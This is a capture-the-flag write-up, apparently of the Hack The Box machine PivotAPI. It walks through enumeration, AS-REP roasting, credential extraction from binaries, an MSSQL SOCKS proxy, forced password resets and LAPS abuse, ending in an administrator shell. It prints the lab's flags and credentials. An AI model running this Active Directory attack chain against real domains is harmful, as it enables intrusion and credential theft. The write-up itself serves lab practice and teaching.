# Enumeration
## Nmap
```bash
nmap -sC -sV -oA nmap/pivotapi 10.10.10.240
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-19-21  03:06PM               103106 10.1.1.414.6453.pdf
| 02-19-21  03:06PM               656029 28475-linux-stack-based-buffer-overflows.pdf
| 02-19-21  12:55PM              1802642 BHUSA09-McDonald-WindowsHeap-PAPER.pdf
| 02-19-21  03:06PM              1018160 ExploitingSoftware-Ch07.pdf
| 08-08-20  01:18PM               219091 notes1.pdf
| 08-08-20  01:34PM               279445 notes2.pdf
| 08-08-20  01:41PM                  105 README.txt
|_02-19-21  03:06PM              1301120 RHUL-MA-2009-06.pdf
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-04-07 15:19:46Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: LicorDeBellota.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
1433/tcp open  ms-sql-s      Microsoft SQL Server  15.00.2000.00
| ms-sql-ntlm-info: 
|   Target_Name: LICORDEBELLOTA
|   NetBIOS_Domain_Name: LICORDEBELLOTA
|   NetBIOS_Computer_Name: PIVOTAPI
|   DNS_Domain_Name: LicorDeBellota.htb
|   DNS_Computer_Name: PivotAPI.LicorDeBellota.htb
|   DNS_Tree_Name: LicorDeBellota.htb
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-04-07T15:18:20
|_Not valid after:  2053-04-07T15:18:20
|_ssl-date: 2023-04-07T15:22:45+00:00; -17s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: LicorDeBellota.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=4/8%Time=643034A8%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03");
Service Info: Host: PIVOTAPI; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -17s, deviation: 0s, median: -17s
| ms-sql-info: 
|   10.10.10.240:1433: 
|     Version: 
|       name: Microsoft SQL Server 
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 
|_    TCP port: 1433
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-04-07T15:22:06
|_  start_date: N/A

```

Hostnames:
`LicorDeBellota.htb, PivotAPI.LicorDeBellota.htb`

## FTP
Grab everything
```bash
wget -m ftp://10.10.10.240/
```

Possible username list.
```bash
exiftool * | grep 'Creator\|Author' | awk '{print $3}'
```

After tidying it up:
```
saif
byron
byron.gronseth
b.gronseth
cairo
Kaorz
alex
```

Userenum with kerbrute.
```bash
/opt/kerbrute userenum --dc 10.10.10.240 -d LicorDeBellota.htb users.txt
```

Gives back a valid user of: `Kaorz@LicorDeBellota.htb`

# Authenticated SMB
Try reproast?
```bash
python3 /opt/impacket/examples/GetNPUsers.py licordebellota.htb/ -usersfile users.txt

$krb5asrep$23$Kaorz@LICORDEBELLOTA.HTB:a83a8e308b9255925ca36065b2dfc5ee$ffc1b5ffbe6b2f70ed17d53f52a2b98a616d525b898c54c4a13dae48a9140df84efa0642b29d01882857225fd11af258a2520b83fb806ecde601b8bd94dbcacbeb578542e12bb760a142d7dcd82193b5a3cd594ea9335b480c5f337acc5a85ea1337bf7c2514996c3ba540b65c24b024d883e7c67c7fd1429156595edb2189e33eebe296d0ecdcb9a27b66309cb6d8e78a2b7b4572876182d75f22439e7864d00d35d25bd27d1f45e68e4c2b105809380a9bfcee44ae42de74089fb483055548c24811e00fbe464d149da4392d62d1b89d5276d8ffd75c04d5e9030e175fa5f45071a29651183b9dc8af8461879a8c45aade1d9743044337
```

Which cracks to:
```
Roper4155
```

Download files in the NetLogon share.

There are two .msg files which are outlook emails. (another user too cybervaca)
```
Due to the problems caused by the Oracle database installed in 2010 in Windows, it has been decided to migrate to MSSQL at the beginning of 2020.
Remember that there were problems at the time of restarting the Oracle service and for this reason a program called "Reset-Service.exe" was created to log in to Oracle and restart the service.
```

`Reset-Service.exe` probs has creds.

Reversing the binary does indeed give creds.

```
svc_oracle:#oracle_s3rV1c3!2010
```

Dump list of users with cme.

Looking in the list there is a svc_mssql account.

Using the same password structure to guess the pwd. (2020 from the email)
```
svc_mssql:#mssql_s3rV1c3!2020
```

It works!

# MSSQL proxy
Going to use mssql as a proxy. :)

Using this repo: [link](https://github.com/blackarrowsec/mssqlproxy/releases/tag/0.1)

```
python3 mssqlclient.py sa@10.10.10.240
```

Then in the sql shell
```
SQL> enable_ole
SQL> upload reciclador.dll c:\windows\temp\reciclador.dll
```

Rename assembly.dll to be `Microsoft.SqlServer.Proxy.dll` then:
```bash
python3 mssqlclient.py sa@10.10.10.240 -install -clr Microsoft.SqlServer.Proxy.dll
python3 mssqlclient.py sa@10.10.10.240 -check -reciclador 'C:\windows\temp\reciclador.dll'
python3 mssqlclient.py sa@10.10.10.240 -start -reciclador 'C:\windows\temp\reciclador.dll'
```

Now it will act as a socks5 proxy on port 1337 which means evil-winrm time.

```
proxychains evil-winrm -u svc_mssql -p '#mssql_s3rV1c3!2020' -i 127.0.0.1
```

Note on desktop:
```
Long running MSSQL Proxies can cause issues.  Please switch to SSH after getting credentials.
```

Also a keepass db.

keepass -> keepass2john -> hashcat -> creds.
```
3v4Si0N:Gu4nCh3C4NaRi0N!23
```

SSH time and we get a shell! :)

User.txt:
```
a6d1fd20f241ae2e03a214755610c4b7
```

# Bloodhound time
get data
```bash
python3 bloodhound.py -u 3v4Si0N@LicorDeBellota.htb -ns 10.10.10.240 -d LicorDeBellota.htb -p 'Gu4nCh3C4NaRi0N!23' -c ALL
```

we can reset the password of DR.ZAIUSS that can rdp into the box.

He can reset the password of SUPERFUME which is a member of developers.

In the ssh session
```
net user Dr.Zaiuss Password123#
```

The use ssh to port forward so we can winrm in.

```
ssh -L 5985:localhost:5985 3v4Si0N@10.10.10.240
```

The evil-winrm (update etc/hosts to have localhost pivotapi)
```
evil-winrm -u 'DR.ZAIUSS' -p 'Password123#' -i pivotapi
```

Same thing for superfume.

# Developer account.
There is another exe that probs contains creds in `C:\developers\Jari` called `restart-mssql.exe`

pwd of `Cos@Chung@!RPG` for Jari

Jari can reset gibdeon and this account can add groups to LAPS. To do this we need powerview.ps1.

```bash
evil-winrm -u 'jari' -p 'Cos@Chung@!RPG' -i pivotapi -s ./ps/
```

```
$pwd = ConvertTo-SecureString 'Password123#' -AsPlainText -Force
Set-DomainUserPassword -identity gibdeon -AccountPassword $pwd
```

Then to add him to the group:
```
$cred = New-Object System.Management.Automation.PSCredential('LicorDeBellora\Gibdeon',$pwd)
Add-AdGroupMember -Identity 'laps adm' -Members gibdeon -Credential $cred
Add-AdGroupMember -Identity 'laps read' -Members gibdeon -Credential $cred
```

Going to use python script to dump out the LAPS stuff.
```
python3 laps.py -u gibdeon -p 'Password123#' -d LicorDeBellota.htb
PIVOTAPI sDTpHAOxbmf057TUYn80
```

Then psexec as administrador (spainsh box)

root.txt
```
C:\Users\cybervaca\Desktop> type root.txt
8c7f8307377ab24438eb6a45834129a4
```


Fin